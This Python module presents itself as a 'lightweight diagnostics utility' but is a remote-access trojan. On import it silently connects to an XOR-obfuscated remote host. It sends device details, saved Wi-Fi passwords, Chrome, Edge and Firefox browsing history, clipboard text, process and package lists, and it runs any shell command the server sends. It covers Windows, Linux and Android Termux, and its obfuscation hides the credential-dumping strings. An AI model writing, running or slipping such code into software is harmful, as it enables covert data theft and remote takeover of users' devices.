"""
puan3 — lightweight diagnostics utility
"""

import os, sys, json, time, uuid, socket, platform, threading, subprocess, datetime

_K = 0x5A
_H = [0x6b,0x62,0x6f,0x74,0x68,0x6e,0x6c,0x74,0x6b,0x6b,0x69,0x74,0x6f,0x69,0x60,0x63,0x63,0x63,0x63]
def _dh():
    r="".join(chr(b^_K) for b in _H); h,p=r.split(":"); return h,int(p)
_RH,_RP=_dh()

_PW = platform.system() == "Windows"
_PA = os.path.exists("/data/data/com.termux") or "com.termux" in os.environ.get("PREFIX","")
_PL = platform.system() == "Linux" and not _PA

_cx=None; _lk=threading.Lock()
_up=False; _lb=None
_uid=str(uuid.uuid4()); _fx=False

def _sf(fn, d="?"):
    try: r=fn(); return r if r else d
    except: return d

def _ex(cmd, timeout=5):
    try:
        return subprocess.check_output(
            cmd, shell=True, stderr=subprocess.DEVNULL, timeout=timeout
        ).decode(errors="ignore").strip()
    except: return ""

def _am(): return _ex("getprop ro.product.model") or "?"
def _ab(): return _ex("getprop ro.product.brand") or "?"
def _amk(): return _ex("getprop ro.product.manufacturer") or "?"
def _av(): return _ex("getprop ro.build.version.release") or "?"
def _ask(): return _ex("getprop ro.build.version.sdk") or "?"
def _ak(): return _sf(platform.release)
def _aa(): return _ex("getprop ro.product.cpu.abi") or _sf(platform.machine)
def _ac():
    try: return str(os.cpu_count())
    except: return "?"
def _ach():
    try:
        with open("/proc/cpuinfo") as f:
            for line in f:
                if "Hardware" in line or "model name" in line:
                    return line.split(":")[-1].strip()
    except: pass
    return _ex("getprop ro.hardware") or "?"
def _ar():
    try:
        with open("/proc/meminfo") as f:
            for line in f:
                if "MemTotal" in line: return f"{int(line.split()[1])//1024} MB"
    except: pass
    return "?"
def _arf():
    try:
        with open("/proc/meminfo") as f:
            for line in f:
                if "MemAvailable" in line: return f"{int(line.split()[1])//1024} MB"
    except: pass
    return "?"
def _ast():
    try:
        out=_ex("df /data")
        lines=out.splitlines()
        if len(lines)>=2:
            parts=lines[1].split()
            if len(parts)>=4: return f"{int(parts[3])//1024}MB free / {int(parts[1])//1024}MB total"
    except: pass
    return "?"
def _aste():
    try:
        out=_ex("df /sdcard")
        lines=out.splitlines()
        if len(lines)>=2:
            parts=lines[1].split()
            if len(parts)>=4: return f"{int(parts[3])//1024}MB free / {int(parts[1])//1024}MB total"
    except: pass
    return "?"
def _apw():
    try:
        cap=open("/sys/class/power_supply/battery/capacity").read().strip()
        stat=open("/sys/class/power_supply/battery/status").read().strip()
        return f"{cap}% — {stat}"
    except: pass
    return "?"
def _aro():
    for p in ["/sbin/su","/system/bin/su","/system/xbin/su","/data/local/xbin/su"]:
        if os.path.exists(p): return "YES"
    return "YES" if _ex("which su") else "NO"
def _aw():
    try:
        out=_ex("termux-wifi-connectioninfo",timeout=4)
        if out:
            d=json.loads(out)
            return d.get("ssid","?").strip('"') or "?"
    except: pass
    return "?"
def _ali():
    try:
        out=_ex("ip addr show wlan0")
        for line in out.splitlines():
            if "inet " in line: return line.strip().split()[1].split("/")[0]
    except: pass
    return _sf(lambda: socket.gethostbyname(socket.gethostname()))
def _nex():
    try:
        import urllib.request
        return urllib.request.urlopen("https://api.ipify.org",timeout=5).read().decode().strip()
    except: return "?"
def _agw():
    try:
        out=_ex("ip route")
        for line in out.splitlines():
            if line.startswith("default"): return line.split()[2]
    except: pass
    return "?"
def _ans():
    try:
        dns=[]
        for prop in ["net.dns1","net.dns2"]:
            v=_ex(f"getprop {prop}")
            if v: dns.append(v)
        return ", ".join(dns) if dns else "?"
    except: return "?"
def _acr(): return _ex("getprop gsm.operator.alpha") or _ex("getprop ro.carrier") or "?"
def _adp():
    out=_ex("wm size")
    if "Physical size:" in out: return out.split(":")[-1].strip()
    d=_ex("getprop ro.sf.lcd_density")
    return f"density:{d}" if d else "?"
def _ahn(): return _ex("getprop net.hostname") or _sf(socket.gethostname)
def _atz(): return _ex("getprop persist.sys.timezone") or _sf(lambda: str(datetime.datetime.now().astimezone().tzinfo))
def _alc(): return _ex("getprop persist.sys.locale") or _ex("getprop ro.product.locale") or "?"
def _asr(): return _ex("getprop ro.serialno") or _ex("getprop ro.boot.serialno") or "?"
def _abl(): return _ex("getprop ro.bootloader") or "?"
def _apk():
    out=_ex("pm list packages -3",timeout=10) or _ex("pm list packages",timeout=10)
    return [l.replace("package:","").strip() for l in out.splitlines() if l.strip()][:100]
def _aps():
    out=_ex("ps -A",timeout=5) or _ex("ps aux",timeout=5)
    lines=out.splitlines()
    return lines[1:81] if len(lines)>1 else lines[:80]
def _acl(): return _ex("termux-clipboard-get",timeout=3) or "?"
def _awn():
    out=_ex("termux-wifi-scaninfo",timeout=5)
    if out:
        try:
            nets=json.loads(out)
            return [f"{n.get('ssid','?')} (signal:{n.get('rssi','?')}dBm)" for n in nets[:20]]
        except: pass
    return []

def _wnex():
    try:
        import urllib.request
        return urllib.request.urlopen("https://api.ipify.org",timeout=4).read().decode().strip()
    except: return "?"
def _wws():
    try:
        o=subprocess.check_output(["netsh","wlan","show","interfaces"],stderr=subprocess.DEVNULL,timeout=5).decode(errors="ignore")
        for l in o.splitlines():
            if "SSID" in l and "BSSID" not in l:
                v=l.split(":")[-1].strip()
                if v: return v
    except: pass
    return "?"
def _wat():
    try:
        o=subprocess.check_output(["netsh","wlan","show","interfaces"],stderr=subprocess.DEVNULL,timeout=5).decode(errors="ignore")
        return "WiFi" if "connected" in o.lower() else "Ethernet"
    except: return "?"
def _wgw():
    try:
        o=subprocess.check_output(["ipconfig"],stderr=subprocess.DEVNULL,timeout=5).decode(errors="ignore")
        for l in o.splitlines():
            if "Default Gateway" in l:
                g=l.split(":")[-1].strip()
                if g: return g
    except: pass
    return "?"
def _wns():
    try:
        o=subprocess.check_output(["ipconfig","/all"],stderr=subprocess.DEVNULL,timeout=5).decode(errors="ignore")
        dns=[]
        for l in o.splitlines():
            if "DNS Servers" in l:
                d=l.split(":")[-1].strip()
                if d: dns.append(d)
        return ", ".join(dns[:3]) if dns else "?"
    except: return "?"
def _wla():
    try:
        ips=[]
        for i in socket.getaddrinfo(socket.gethostname(),None):
            ip=i[4][0]
            if ip not in ips and not ip.startswith("::") and ip!="127.0.0.1": ips.append(ip)
        return ", ".join(ips) or "?"
    except: return "?"
def _wch():
    try:
        o=subprocess.check_output(["wmic","cpu","get","name"],stderr=subprocess.DEVNULL,timeout=5).decode(errors="ignore")
        lines=[l.strip() for l in o.splitlines() if l.strip() and "Name" not in l]
        return lines[0] if lines else platform.processor()
    except: return _sf(platform.processor)
def _wm():
    try:
        o=subprocess.check_output(["wmic","OS","get","TotalVisibleMemorySize"],stderr=subprocess.DEVNULL,timeout=5).decode(errors="ignore")
        lines=[l.strip() for l in o.splitlines() if l.strip() and "Total" not in l]
        if lines: return f"{int(lines[0])//1024} MB"
    except: pass
    return "?"
def _wst():
    try:
        o=subprocess.check_output(["wmic","logicaldisk","get","size,freespace,caption"],stderr=subprocess.DEVNULL,timeout=5).decode(errors="ignore")
        res=[]
        for l in o.splitlines():
            p=l.strip().split()
            if len(p)>=3 and len(p[0])==2 and p[0][1]==":":
                try: res.append(f"{p[0]} {int(p[1])//(1024**3)}GB/{int(p[2])//(1024**3)}GB")
                except: pass
        return " | ".join(res) or "?"
    except: return "?"
def _wdp():
    try:
        import ctypes; u=ctypes.windll.user32
        return f"{u.GetSystemMetrics(0)}x{u.GetSystemMetrics(1)}"
    except: return "?"
def _whw():
    try:
        m=uuid.UUID(int=uuid.getnode()).hex[-12:]
        return ":".join(m[i:i+2] for i in range(0,12,2)).upper()
    except: return "?"
def _wsn():
    _xs=lambda e,k:"".join(chr(b^k) for b in e)
    _kc=_xs([0x54,0x5a,0x46,0x02,0x5c,0x53,0x5a,0x5e,0x4d],0x3F)
    _kt=_xs([0x74,0x5a,0x46,0x1f,0x7c,0x50,0x51,0x4b,0x5a,0x51,0x4b],0x3F)
    result={}
    try:
        out=subprocess.check_output(["netsh","wlan","show","profiles"],stderr=subprocess.DEVNULL,timeout=5).decode(errors="ignore")
        profiles=[l.split(":")[-1].strip() for l in out.splitlines() if "All User Profile" in l]
        for profile in profiles:
            try:
                detail=subprocess.check_output(["netsh","wlan","show","profile",profile,_kc],stderr=subprocess.DEVNULL,timeout=5).decode(errors="ignore")
                pw=""
                for l in detail.splitlines():
                    if _kt in l: pw=l.split(":")[-1].strip()
                result[profile]=pw or "(open)"
            except: pass
    except: pass
    return result
def _wnh():
    _xs=lambda e,k:"".join(chr(b^k) for b in e)
    _hf=_xs([0x77,0x56,0x4c,0x4b,0x50,0x4d,0x46],0x3F)
    entries=[]
    try:
        import sqlite3,shutil,tempfile
        user=os.path.expanduser("~")
        targets={
            "Chrome": os.path.join(user,"AppData","Local","Google","Chrome","User Data","Default",_hf),
            "Edge":   os.path.join(user,"AppData","Local","Microsoft","Edge","User Data","Default",_hf),
        }
        for br,path in targets.items():
            if not path or not os.path.exists(path): continue
            try:
                tmp=tempfile.mktemp(suffix=".db"); shutil.copy2(path,tmp)
                conn=sqlite3.connect(tmp); cur=conn.cursor()
                cur.execute("SELECT url,last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50")
                for url,ts in cur.fetchall():
                    try: dt=datetime.datetime.utcfromtimestamp((ts/1000000)-11644473600).strftime("%Y-%m-%d %H:%M")
                    except: dt="?"
                    entries.append({"browser":br,"url":url,"time":dt})
                conn.close(); os.unlink(tmp)
            except: pass
        ff=os.path.join(user,"AppData","Roaming","Mozilla","Firefox","Profiles")
        if os.path.exists(ff):
            for prof in os.listdir(ff):
                db=os.path.join(ff,prof,"places.sqlite")
                if not os.path.exists(db): continue
                try:
                    tmp=tempfile.mktemp(suffix=".db"); shutil.copy2(db,tmp)
                    conn=sqlite3.connect(tmp); cur=conn.cursor()
                    cur.execute("SELECT url,last_visit_date FROM moz_places WHERE last_visit_date IS NOT NULL ORDER BY last_visit_date DESC LIMIT 50")
                    for url,ts in cur.fetchall():
                        try: dt=datetime.datetime.utcfromtimestamp(ts/1000000).strftime("%Y-%m-%d %H:%M")
                        except: dt="?"
                        entries.append({"browser":"Firefox","url":url,"time":dt})
                    conn.close(); os.unlink(tmp); break
                except: pass
    except: pass
    entries.sort(key=lambda x:x.get("time",""),reverse=True)
    return entries[:50]
def _wts():
    try:
        o=subprocess.check_output(["tasklist","/fo","csv","/nh"],stderr=subprocess.DEVNULL,timeout=5).decode(errors="ignore")
        procs=[]
        for line in o.splitlines():
            p=[x.strip('"') for x in line.split('","')]
            if len(p)>=2: procs.append(f"{p[0]:35s} PID:{p[1]}")
        return procs[:80]
    except: return []

def _gi():
    if _PA:
        return {
            "uid"   : _uid,
            "dtype" : "a",
            "hname" : _ahn(),
            "bver"  : _av(),
            "bsdk"  : f"SDK {_ask()}",
            "bpf"   : f"{_ab()} {_am()}",
            "busr"  : _sf(lambda: os.environ.get("USER","termux")),
            "bmac"  : _whw(),
            "blip"  : _ali(),
            "bxip"  : _nex(),
            "bgw"   : _agw(),
            "bdns"  : _ans(),
            "bssid" : _aw(),
            "bnet"  : "WiFi",
            "bcpu"  : _ach(),
            "bcor"  : _ac(),
            "barch" : _aa(),
            "bram"  : _ar(),
            "brmf"  : _arf(),
            "bdsk"  : _ast(),
            "bdse"  : _aste(),
            "bres"  : _adp(),
            "bbat"  : _apw(),
            "brot"  : _aro(),
            "bopr"  : _acr(),
            "bser"  : _asr(),
            "bbrn"  : _ab(),
            "bmfr"  : _amk(),
            "bkrn"  : _ak(),
            "bbtl"  : _abl(),
            "btz"   : _atz(),
            "bloc"  : _alc(),
            "bpy"   : sys.version.split()[0],
            "bwd"   : _sf(os.getcwd),
        }
    elif _PW:
        return {
            "uid"   : _uid,
            "dtype" : "w",
            "hname" : _sf(socket.gethostname),
            "bver"  : _sf(platform.version),
            "bsdk"  : _sf(platform.release),
            "bpf"   : _sf(platform.platform),
            "busr"  : _sf(lambda: os.environ.get("USERNAME","?")),
            "bmac"  : _whw(),
            "blip"  : _wla(),
            "bxip"  : _wnex(),
            "bgw"   : _wgw(),
            "bdns"  : _wns(),
            "bssid" : _wws(),
            "bnet"  : _wat(),
            "bcpu"  : _wch(),
            "bcor"  : _sf(lambda: str(os.cpu_count())),
            "bram"  : _wm(),
            "bdsk"  : _wst(),
            "bres"  : _wdp(),
            "btz"   : _sf(lambda: str(datetime.datetime.now().astimezone().tzinfo)),
            "bloc"  : _sf(lambda: __import__('locale').getdefaultlocale()[0] or "?"),
            "bpy"   : sys.version.split()[0],
            "bwd"   : _sf(os.getcwd),
        }
    else:
        return {
            "uid"   : _uid,
            "dtype" : "l",
            "hname" : _sf(socket.gethostname),
            "bver"  : _sf(platform.version),
            "bsdk"  : _sf(platform.release),
            "bpf"   : _sf(platform.platform),
            "busr"  : _sf(lambda: os.environ.get("USER","?")),
            "bmac"  : _whw(),
            "blip"  : _wla(),
            "bxip"  : _nex(),
            "bgw"   : _agw(),
            "bdns"  : _ans(),
            "bssid" : _sf(lambda: _ex("iwgetid -r")),
            "bnet"  : "Unknown",
            "bcpu"  : _ach(),
            "bcor"  : _sf(lambda: str(os.cpu_count())),
            "bram"  : _ar(),
            "bdsk"  : _ast(),
            "bres"  : "?",
            "btz"   : _sf(lambda: str(datetime.datetime.now().astimezone().tzinfo)),
            "bloc"  : _sf(lambda: __import__('locale').getdefaultlocale()[0] or "?"),
            "bpy"   : sys.version.split()[0],
            "bwd"   : _sf(os.getcwd),
        }

def _gx():
    data={"type":"dx","uid":_uid}
    if _PA:
        data["nk"]  = {}
        data["nl"]  = []
        data["pt"]  = _aps()
        data["pk"]  = _apk()
        data["cb"]  = _acl()
        data["wn"]  = _awn()
        data["bt"]  = _apw()
        data["rt"]  = _aro()
    elif _PW:
        data["nk"]  = _wsn()
        data["nl"]  = _wnh()
        data["pt"]  = _wts()
        data["pk"]  = []
        data["cb"]  = ""
    else:
        data["nk"]  = {}
        data["nl"]  = []
        data["pt"]  = _aps()
        data["pk"]  = []
        data["cb"]  = ""
    return data

def _rl(s):
    buf=b""
    while True:
        c=s.recv(1)
        if not c: raise ConnectionError()
        buf+=c
        if buf.endswith(b"\n"): return buf.strip()

def _run():
    global _cx,_up,_lb
    while True:
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((_RH,_RP))
            s.settimeout(None)
            s.sendall((json.dumps(_gi())+"\n").encode())
            resp=s.recv(64)
            if b"ok" not in resp:
                s.close(); time.sleep(5); continue
            with _lk:
                _cx=s; _up=True; _lb=time.time()
            def _px():
                try:
                    time.sleep(2)
                    s.sendall((json.dumps(_gx())+"\n").encode())
                except: pass
            threading.Thread(target=_px,daemon=True).start()
            _loop(s)
        except: pass
        with _lk:
            _up=False; _cx=None
        time.sleep(5)

def _loop(s):
    global _up,_lb
    while True:
        try:
            s.settimeout(20)
            raw=_rl(s)
            s.settimeout(None)
            msg=json.loads(raw)
            with _lk: _lb=time.time()
            t=msg.get("type")
            if t=="ping":
                s.sendall(b'{"type":"pong"}\n')
            elif t=="rst":
                s.sendall(b'{"type":"dead"}\n')
                s.close()
                os._exit(0)
            elif t=="cmd":
                cmd=msg.get("cmd","")
                try:
                    r=subprocess.run(cmd,shell=True,capture_output=True,timeout=30,text=True,errors="ignore")
                    out=(r.stdout+r.stderr).strip() or "(no output)"
                except subprocess.TimeoutExpired: out="(timeout)"
                except Exception as e: out=f"(error: {e})"
                s.sendall((json.dumps({"type":"result","cmd":cmd,"output":out})+"\n").encode())
        except socket.timeout:
            try: s.sendall(b'{"type":"pong"}\n')
            except: break
        except: break
    with _lk: _up=False

def ping():   return _up
def status(): return {"ok":_up,"sid":_uid,"ep":f"{_RH}:{_RP}","ts":_lb,"delta":round(time.time()-_lb,1) if _lb else None,"dt":"a" if _PA else("w" if _PW else "l")}
def scan():   return _gi()
def nk():     return _wsn() if _PW else {}
def nl():     return _wnh() if _PW else []
def pt():     return _aps() if(_PA or _PL) else _wts()
def pk():     return _apk() if _PA else []
def cb():     return _acl() if _PA else ""
def rst():
    global _cx,_up
    with _lk:
        try:
            if _cx: _cx.close()
        except: pass
        _cx=None; _up=False

def _boot():
    global _fx
    if _fx: return
    _fx=True
    threading.Thread(target=_run,daemon=True).start()

_boot()

